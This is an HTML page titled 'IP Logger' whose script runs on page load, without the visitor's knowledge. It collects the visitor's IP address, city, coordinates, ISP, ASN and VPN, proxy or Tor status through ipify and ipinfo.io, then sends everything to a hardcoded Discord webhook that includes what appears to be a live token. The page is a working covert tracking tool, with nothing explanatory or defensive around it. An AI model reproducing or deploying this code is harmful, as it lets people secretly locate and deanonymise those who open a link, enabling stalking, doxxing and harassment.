<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>IP Logger</title>
</head>
<body>
    <script>
        const webhookURL = "https://discord.com/api/webhooks/1335135046633525330/lu2M-H2A36_E_68tGUVcgQnwqInav48znOPlRR6R-_GuFGWyHEdyE4-S32eAArllrh4X";

        fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
            const ip = data.ip;
            return fetch(`https://ipinfo.io/widget/demo/${ip}`);
        })
        .then(res => res.json())
        .then(data => {
            if (!data.data) throw new Error("Unexpected response structure");
            const info = data.data;

            const embed = {
                username: "IP Tracker",
                avatar_url: "https://cdn-icons-png.flaticon.com/512/3061/3061341.png", 
                embeds: [{
                    title: "üåç IP Information",
                    color: 3447003, // Blue
                    fields: [
                        { name: "üìå IP Address", value: info.ip || 'N/A', inline: false },
                        { name: "üìç Location", value: `${info.city || 'N/A'}, ${info.region || 'N/A'}, ${info.country || 'N/A'}`, inline: false },
                        { name: "üìå Coordinates", value: info.loc || 'N/A', inline: false },
                        { name: "üè¢ Organization", value: info.org || 'N/A', inline: false },

                        { name: "üåê Network Details", value: "**ASN:** " + (info.asn?.asn || 'N/A') +  
                            "\n**ASN Name:** " + (info.asn?.name || 'N/A') +  
                            "\n**ASN Domain:** " + (info.asn?.domain || 'N/A') +  
                            "\n**ASN Route:** " + (info.asn?.route || 'N/A') +  
                            "\n**ASN Type:** " + (info.asn?.type || 'N/A'), inline: false },

                        { name: "üè¢ Company Details", value: "**Company Name:** " + (info.company?.name || 'N/A') +  
                            "\n**Company Domain:** " + (info.company?.domain || 'N/A') +  
                            "\n**Company Type:** " + (info.company?.type || 'N/A'), inline: false },

                        { name: "‚ö° Connection Type", value: "**Anycast:** " + (info.is_anycast ? "‚úÖ Yes" : "‚ùå No") +  
                            "\n**Mobile:** " + (info.is_mobile ? "‚úÖ Yes" : "‚ùå No") +  
                            "\n**Anonymous:** " + (info.is_anonymous ? "‚úÖ Yes" : "‚ùå No") +  
                            "\n**Satellite:** " + (info.is_satellite ? "‚úÖ Yes" : "‚ùå No") +  
                            "\n**Hosting:** " + (info.is_hosting ? "‚úÖ Yes" : "‚ùå No"), inline: false },

                        { name: "üîí Privacy Details", value: "**VPN:** " + (info.privacy?.vpn ? "‚úÖ Yes" : "‚ùå No") +  
                            "\n**Proxy:** " + (info.privacy?.proxy ? "‚úÖ Yes" : "‚ùå No") +  
                            "\n**Tor:** " + (info.privacy?.tor ? "‚úÖ Yes" : "‚ùå No") +  
                            "\n**Relay:** " + (info.privacy?.relay ? "‚úÖ Yes" : "‚ùå No") +  
                            "\n**Hosting Provider:** " + (info.privacy?.service || 'N/A'), inline: false }
                    ],
                    footer: { text: "IP Tracker | Data from ipinfo.io" },
                    timestamp: new Date()
                }]
            };

            return fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(embed)
            });
        })
        .then(() => console.log("‚úÖ IP Info Sent Successfully"))
        .catch(err => console.error("‚ùå Error:", err));
    </script>
</body>
</html>
